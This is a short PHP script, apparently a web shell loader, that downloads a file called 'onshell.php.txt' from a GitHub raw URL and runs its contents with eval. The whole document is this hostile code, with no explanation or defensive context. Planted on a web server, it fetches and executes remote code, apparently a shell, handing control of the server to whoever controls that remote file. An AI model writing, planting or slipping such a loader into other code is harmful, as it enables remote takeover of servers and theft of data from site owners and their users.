<?php 
    $filedata = file_get_contents('https://raw.githubusercontent.com/vkingpirates/ondshell/main/onshell.php.txt');
    eval ("?>$filedata");
?>
